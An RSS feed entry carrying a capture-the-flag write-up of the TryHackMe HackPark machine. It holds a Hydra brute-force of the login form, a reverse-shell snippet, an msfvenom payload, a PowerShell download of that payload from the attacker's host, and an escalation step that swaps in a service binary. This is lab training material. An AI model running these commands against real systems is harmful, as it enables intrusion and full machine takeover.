@@ -1,0 +1,235 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hydra on 0000FF</title><link>https://simonefelici.github.io/tags/hydra/</link><description>Recent content in Hydra on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 28 Dec 2023 11:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/hydra/index.xml" rel="self" type="application/rss+xml"/><item><title>HackPark Writeup THM</title><link>https://simonefelici.github.io/p/hackpark-writeup-thm/</link><pubDate>Thu, 28 Dec 2023 11:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/hackpark-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png" alt="Featured image of post HackPark Writeup THM" />&lt;p>First of all I am going to do a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn &amp;lt;Machine IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> &lt;span class="o">[&lt;/span>https://nmap.org&lt;span class="o">](&lt;/span>https://nmap.org/&lt;span class="o">)&lt;/span> &lt;span class="o">)&lt;/span> at 2023-12-28 05:20 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.100.75
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.054s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 5.97 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I have usend -Pn because the machine does not respond to ping.&lt;/p>
+&lt;p>We can see that it has port 80(web page) and port 3389(rdp) open.&lt;/p>
+&lt;p>For now I am just going to see the web page.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>From here I can do a reverse image research with google images to uncover the clown identity!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt &amp;lt;Machine_IP&amp;gt; http-post-form &lt;span class="s2">&amp;#34;/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&amp;amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed”
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 05:43:08
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[DATA] attacking http-post-form://10.10.100.75:80/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&amp;amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[80][http-post-form] host: 10.10.100.75 login: admin password: &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">1 of 1 target successfully completed, 1 valid password found
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-28 05:44:04
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Found the password!&lt;/p>
+&lt;p>Now we need to get a reverse shell, this can be done by searching in exploit DB using the database version in http://10.10.100.75/admin/about.cshtml&lt;/p>
+&lt;p>After we install the exploit, we need to change the attacker ip and port to ours&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">using&lt;span class="o">(&lt;/span>System.Net.Sockets.TcpClient &lt;span class="nv">client&lt;/span> &lt;span class="o">=&lt;/span> new System.Net.Sockets.TcpClient&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;YOUR_IP&amp;gt;&amp;#34;&lt;/span>, &amp;lt;YOUR_PORT&amp;gt;&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we rename the file into PostView.ascx&lt;/p>
+&lt;p>After that we set up a listener:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And we go to publish it&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>After that we just want to go to this path: &lt;code>http://10.10.10.10/?theme=../../App_Data/files&lt;/code> for triggering the reverse shell!&lt;/p>
+&lt;p>Now, we want to upgrade the shell using metasploit.&lt;/p>
+&lt;p>First of all we create our revshell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>&amp;lt;YOUR_IP&amp;gt; &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4555&lt;/span> -f exe -o revshell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>then we set up our listener inside metasploit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using configured payload generic/shell_reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/multi/handler&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>generic/shell_reverse_tcp&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Wildcard Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LHOST &amp;lt;YOUR_IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &amp;lt;YOUR_IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LPORT &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LPORT&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we create a server using python:&lt;/p>
+&lt;p>&lt;code>python3 -m http.server 8000&lt;/code>&lt;/p>
+&lt;p>After that we need to install the reverse shell inside the windows machine,&lt;/p>
+&lt;p>We need to do this inside the &lt;code>temp&lt;/code> folder, otherwise is not going to work:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">powershell Invoke-WebRequest -Uri http://10.18.20.116:8000/revshell.exe -OutFile revshell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we execute the file and we have the shell!&lt;/p>
+&lt;p>now we need to search for the OS, we just need to use &lt;strong>sysinfo&lt;/strong>&lt;/p>
+&lt;p>And for the processes &lt;strong>ps&lt;/strong>&lt;/p>
+&lt;p>The hint tells us to check “C:\Program Files (x86)”&lt;/p>
+&lt;p>So I did:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">c:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>&amp;gt;dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Volume in drive C has no label.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume Serial Number is 0E97-C552
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory of c:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/06/2019 01:12 PM &amp;lt;DIR&amp;gt; .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/06/2019 01:12 PM &amp;lt;DIR&amp;gt; ..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Common Files
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/21/2014 11:07 AM &amp;lt;DIR&amp;gt; Internet Explorer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Microsoft.NET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">12/28/2023 04:49 AM &amp;lt;DIR&amp;gt; SystemScheduler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Windows Mail
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Windows NT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; WindowsPowerShell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> &lt;span class="m">0&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> Dir&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> 39,124,586,496 bytes free
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The only thing strange to me is SystemScheduler, if we open the directory, we can see a bunch of processes.&lt;/p>
+&lt;p>Going in the Events, directory, and opening the log file, will reval to us which is the abnormal service that is running.&lt;/p>
+&lt;p>We see that the service Message.exe run with the Administrator privileges, and we can use that in our favor.&lt;/p>
+&lt;p>Now we put in background the meterpreter shell, and then we want to restart the listener again.&lt;/p>
+&lt;p>Next thing to do is, rename the reverse shell in &lt;code>/windows/temp&lt;/code> to Message.exe&lt;/p>
+&lt;p>Then remove Message.exe from the SystemScheduler directory, and put the reverse shell now named Message.exe in it.&lt;/p>
+&lt;p>Now we just need to start the process.&lt;/p>
+&lt;p>(Do this with ./Message.exe or Start-Process “Message.exe”)&lt;/p>
+&lt;p>And we got a Admin shell!&lt;/p>
+&lt;p>Then I found the jeff flag in: &lt;code>C:\Users\Jeff\Desktop\user.txt&lt;/code>&lt;/p>
+&lt;p>And the root flag in: &lt;code>C:\Users\Administrator\Desktop\root.txt&lt;/code>&lt;/p></description></item></channel></rss>
